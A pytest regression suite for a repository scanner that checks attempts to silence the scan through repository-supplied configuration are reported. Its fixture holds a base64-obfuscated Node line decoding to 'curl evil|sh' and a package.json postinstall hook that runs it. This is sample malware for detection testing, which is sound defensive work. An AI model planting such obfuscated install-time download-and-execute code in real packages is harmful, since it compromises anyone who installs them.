"""Attempts to make the scanner report a clean result without examining anything.

Every test here is written from the position of somebody who controls the
repository being scanned and wants the pipeline to stay green. That is the real
adversary: the scan target is untrusted input, and a configuration file that
lives inside it is part of that input.

None of these attacks is *prevented*, because a repository has legitimate
reasons to exclude a generated tree and to turn off a detector that does not
apply to it. What is asserted throughout is that the reduction in coverage
appears in the output. The property under test is a single sentence:

    a scan that examined nothing must never look like a scan that found nothing.

These are regression tests for an adversarial review in which each of the five
cases below produced silence and exit code 0.
"""

from __future__ import annotations

import sys

import pytest

from cordon import Scanner
from cordon.core.config import Config, resolve
from cordon.core.errors import ConfigError, ExitCode
from cordon.core.models import Category, Severity
from cordon.core.policy import PolicyGate

PAYLOAD = (
    "const {execSync} = require('child_process');\n"
    "execSync(Buffer.from('Y3VybCBldmlsfHNo','base64').toString());\n"
)
MANIFEST = '{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node p.js"}}'


def hostile_repo(root, config_text: str):
    """A repository whose payload any working scan must find, plus a config
    written to stop it being found."""
    root.mkdir(parents=True, exist_ok=True)
    (root / "p.js").write_text(PAYLOAD)
    (root / "package.json").write_text(MANIFEST)
    (root / "cordon.yaml").write_text(config_text)
    return root


def scan(root, **overrides):
    return Scanner(resolve(root=root).with_overrides(use_cache=False, **overrides)).scan(root)


def rule_ids(result) -> set[str]:
    return {f.rule_id for f in result.findings}


class TestBlindingByExclusion:
    """A1. The original finding: `exclude: ["**/*"]` produced zero findings,
    zero files scanned, exit 0 and no warning of any kind."""

    def test_excluding_everything_is_reported(self, tmp_path) -> None:
        root = hostile_repo(tmp_path / "r", 'scan:\n  exclude:\n    - "**/*"\n')
        result = scan(root)
        assert "POLICY.COVERAGE.NOTHING_SCANNED" in rule_ids(result)

    def test_excluding_everything_does_not_exit_clean(self, tmp_path) -> None:
        """The exit code is what a CI pipeline acts on. A finding nobody fails
        on is a finding nobody sees."""
        root = hostile_repo(tmp_path / "r", 'scan:\n  exclude:\n    - "**/*"\n')
        config = resolve(root=root).with_overrides(use_cache=False)
        verdict = PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
        assert verdict.exit_code is not ExitCode.CLEAN

    def test_the_report_is_high_severity(self, tmp_path) -> None:
        root = hostile_repo(tmp_path / "r", 'scan:\n  exclude:\n    - "**/*"\n')
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
        )
        assert finding.severity is Severity.HIGH
        assert finding.category is Category.POLICY

    def test_the_message_says_nothing_was_examined(self, tmp_path) -> None:
        """The wording carries the whole point. A reader who sees 'no findings'
        must not conclude 'no problems'."""
        root = hostile_repo(tmp_path / "r", 'scan:\n  exclude:\n    - "**/*"\n')
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.NOTHING_SCANNED"
        )
        assert "no files were examined" in finding.message.lower()
        assert finding.remediation

    def test_an_include_list_is_an_exclusion_written_backwards(self, tmp_path) -> None:
        """`include: ["docs/**"]` in a repository with no docs directory drops
        every file just as surely, and was the obvious way around a fix that
        only counted `exclude`."""
        root = hostile_repo(tmp_path / "r", 'scan:\n  include:\n    - "docs/**"\n')
        assert "POLICY.COVERAGE.NOTHING_SCANNED" in rule_ids(scan(root))

    def test_an_empty_directory_is_not_reported(self, tmp_path) -> None:
        """Nothing examined because nothing is there is not a coverage loss, and
        a check that fires on it teaches people to ignore it."""
        root = tmp_path / "empty"
        root.mkdir()
        assert "POLICY.COVERAGE.NOTHING_SCANNED" not in rule_ids(scan(root))

    def test_a_normal_repository_is_not_reported(self, tmp_path) -> None:
        root = tmp_path / "ok"
        root.mkdir()
        for i in range(40):
            (root / f"m{i}.py").write_text(f"VALUE = {i}\n")
        ids = rule_ids(scan(root))
        assert "POLICY.COVERAGE.NOTHING_SCANNED" not in ids
        assert "POLICY.COVERAGE.BROAD_EXCLUSION" not in ids


class TestBroadExclusion:
    """The partial version of the same attack: exclude almost everything, leave
    one harmless file so the scan is not visibly empty."""

    def build(self, tmp_path, excluded: int, kept: int, pattern: str):
        root = tmp_path / "r"
        (root / "vendor").mkdir(parents=True)
        for i in range(excluded):
            (root / "vendor" / f"v{i}.js").write_text(f"var v = {i};\n")
        for i in range(kept):
            (root / f"k{i}.js").write_text(f"var k = {i};\n")
        (root / "cordon.yaml").write_text(f'scan:\n  exclude:\n    - "{pattern}"\n')
        return root

    def test_excluding_most_of_the_tree_is_reported(self, tmp_path) -> None:
        root = self.build(tmp_path, excluded=90, kept=2, pattern="vendor/**")
        assert "POLICY.COVERAGE.BROAD_EXCLUSION" in rule_ids(scan(root))

    def test_the_report_counts_what_was_dropped(self, tmp_path) -> None:
        """A share alone is not actionable. The reader needs the numbers to
        judge whether the exclusion is the vendored tree they expect."""
        root = self.build(tmp_path, excluded=90, kept=2, pattern="vendor/**")
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.BROAD_EXCLUSION"
        )
        assert "90 of 93" in finding.message
        assert "%" in finding.message

    def test_a_modest_exclusion_is_not_reported(self, tmp_path) -> None:
        """Excluding a generated directory is ordinary and correct."""
        root = self.build(tmp_path, excluded=10, kept=40, pattern="vendor/**")
        assert "POLICY.COVERAGE.BROAD_EXCLUSION" not in rule_ids(scan(root))

    def test_a_small_repository_is_not_reported(self, tmp_path) -> None:
        """In a five-file repository one excluded directory is most of the tree,
        so the share alone would fire constantly on correct configuration."""
        root = self.build(tmp_path, excluded=4, kept=1, pattern="vendor/**")
        assert "POLICY.COVERAGE.BROAD_EXCLUSION" not in rule_ids(scan(root))

    def test_the_payload_is_still_found_when_not_excluded(self, tmp_path) -> None:
        """A guard against the fix being satisfied by reporting coverage while
        quietly scanning nothing."""
        root = hostile_repo(tmp_path / "r", "scan:\n  severity_threshold: low\n")
        findings = scan(root).findings
        assert findings
        assert any("DECODE_EXEC" in f.rule_id for f in findings)


class TestDisabledDetectors:
    """The other half of A1: the config disabled the two detectors that would
    have found the payload, and the output said nothing about it."""

    def test_a_detector_the_repository_disabled_is_reported(self, tmp_path) -> None:
        root = hostile_repo(
            tmp_path / "r",
            "scan:\n  detectors:\n    capability: false\n    secrets: false\n",
        )
        assert "POLICY.COVERAGE.DETECTOR_DISABLED" in rule_ids(scan(root))

    def test_the_report_names_each_detector(self, tmp_path) -> None:
        root = hostile_repo(
            tmp_path / "r",
            "scan:\n  detectors:\n    capability: false\n    secrets: false\n",
        )
        finding = next(
            f for f in scan(root).findings if f.rule_id == "POLICY.COVERAGE.DETECTOR_DISABLED"
        )
        assert "capability" in finding.message
        assert "secrets" in finding.message

    def test_an_operator_disabling_a_detector_is_not_reported(self, tmp_path) -> None:
        """`--no-detector secrets` typed by the person running the scan is not
        an attack on that person. Only configuration that came from the scan
        target is treated as adversarial."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "p.js").write_text(PAYLOAD)
        config = Config.default().with_overrides(
            use_cache=False, detectors={"secrets": False, "capability": False}
        )
        result = Scanner(config).scan(root)
        assert "POLICY.COVERAGE.DETECTOR_DISABLED" not in rule_ids(result)


class TestWithheldPowers:
    """A7 and A5b. A configuration file inside the scan target asked for
    capabilities it must not have. The request is refused; the refusal is
    reported rather than applied in silence."""

    def test_a_repository_cannot_raise_its_own_limits(self, tmp_path) -> None:
        """Otherwise any repository can set a multi-hour timeout and a gigabyte
        file ceiling, and the shared CI machine is the target."""
        root = hostile_repo(
            tmp_path / "r",
            "scan:\n  limits:\n    max_file_bytes: 999999999\n    total_timeout: 99999\n",
        )
        config = resolve(root=root)
        defaults = Config.default()
        assert config.limits.max_file_bytes == defaults.limits.max_file_bytes
        assert config.limits.total_timeout == defaults.limits.total_timeout
        assert "limits.max_file_bytes" in config.clamped_settings
        assert "limits.total_timeout" in config.clamped_settings

    def test_a_repository_cannot_supply_its_own_rule_pack(self, tmp_path) -> None:
        """A rule pack decides what counts as a finding. A scan target that
        writes its own rules decides its own verdict."""
        root = tmp_path / "r"
        root.mkdir()
        (root / "mine.yaml").write_text("rules: []\n")
        (root / "cordon.yaml").write_text("rules:\n  extra:\n    - mine.yaml\n")
        config = resolve(root=root)
        assert not config.extra_rule_paths
        assert "rules.extra" in config.clamped_settings

    def test_each_withheld_setting_is_reported(self, tmp_path) -> None:
        """Silently ignoring the setting would be safe and useless: the author
        would believe it applied."""
        root = hostile_repo(
            tmp_path / "r",
            "scan:\n  limits:\n    max_file_bytes: 999999999\n",
        )
        clamped = [f for f in scan(root).findings if f.rule_id == "POLICY.CONFIG.CLAMPED"]
        assert clamped
        assert "limits.max_file_bytes" in clamped[0].message
        assert clamped[0].remediation

    def test_an_explicit_config_file_keeps_its_powers(self, tmp_path) -> None:
        """`--config` is operator input. Someone who names a file on the command
        line has chosen to trust it, and clamping it there would make the flag
        useless for the tuning it exists for."""
        cfg = tmp_path / "operator.yaml"
        cfg.write_text("scan:\n  limits:\n    max_file_bytes: 99999999\n")
        config = resolve(root=tmp_path, config_path=cfg)
        assert config.limits.max_file_bytes == 99999999
        assert not config.clamped_settings

    def test_a_trusted_config_reports_nothing(self, tmp_path) -> None:
        root = tmp_path / "r"
        root.mkdir()
        (root / "a.py").write_text("VALUE = 1\n")
        ids = rule_ids(Scanner(Config.default().with_overrides(use_cache=False)).scan(root))
        assert "POLICY.CONFIG.CLAMPED" not in ids


@pytest.mark.skipif(sys.platform == "win32", reason="symlink creation needs privilege on Windows")
class TestConfigOutsideTheScanRoot:
    """A8. `cordon.yaml` was a symlink, so the file reviewed alongside the code
    was not the file that configured the scan."""

    def test_a_symlinked_config_is_refused(self, tmp_path) -> None:
        outside = tmp_path / "outside.yaml"
        outside.write_text('scan:\n  exclude:\n    - "**/*"\n')
        root = tmp_path / "r"
        root.mkdir()
        (root / "a.py").write_text("VALUE = 1\n")
        (root / "cordon.yaml").symlink_to(outside)
        with pytest.raises(ConfigError) as exc:
            resolve(root=root)
        assert "outside the scan root" in str(exc.value)

    def test_the_refusal_names_the_way_out(self, tmp_path) -> None:
        """A repository may legitimately share configuration. The error has to
        say how, or it gets worked around by deleting the check."""
        outside = tmp_path / "outside.yaml"
        outside.write_text("scan:\n  severity_threshold: low\n")
        root = tmp_path / "r"
        root.mkdir()
        (root / "cordon.yaml").symlink_to(outside)
        with pytest.raises(ConfigError) as exc:
            resolve(root=root)
        assert "--config" in (exc.value.hint or "")

    def test_a_symlink_within_the_scan_root_is_allowed(self, tmp_path) -> None:
        """The file is still reviewed with the code, which is the property that
        matters. Refusing this would break monorepos that share one config."""
        root = tmp_path / "r"
        (root / "shared").mkdir(parents=True)
        (root / "shared" / "base.yaml").write_text("scan:\n  severity_threshold: low\n")
        (root / "cordon.yaml").symlink_to(root / "shared" / "base.yaml")
        assert resolve(root=root).severity_threshold is Severity.LOW


class TestUnknownDetectorName:
    """A11. A mistyped `--detector` name selected no detectors, so the scan ran
    no checks, found nothing and exited 0. A typo in a CI file silently turned
    off all scanning while the pipeline stayed green."""

    def test_an_unknown_name_is_an_error(self, tmp_path) -> None:
        from cordon.core.registry import Registry

        with pytest.raises(ConfigError) as exc:
            Registry().detectors(only=["secrest"])
        assert "secrest" in str(exc.value)

    def test_the_error_lists_the_real_names(self, tmp_path) -> None:
        """Without this the fix converts a silent failure into a loud one that
        still does not say what to type."""
        from cordon.core.registry import Registry

        with pytest.raises(ConfigError) as exc:
            Registry().detectors(only=["secrest"])
        assert "secrets" in (exc.value.hint or "")

    def test_a_correct_name_still_selects_it(self, tmp_path) -> None:
        from cordon.core.registry import Registry

        loaded = Registry().detectors(only=["secrets"])
        assert [d.id for d in loaded] == ["secrets"]

    def test_one_bad_name_among_good_ones_is_still_an_error(self) -> None:
        """Otherwise the failure is worse than the original: it looks like it
        worked, and one check is missing."""
        from cordon.core.registry import Registry

        with pytest.raises(ConfigError):
            Registry().detectors(only=["secrets", "capability", "typo"])
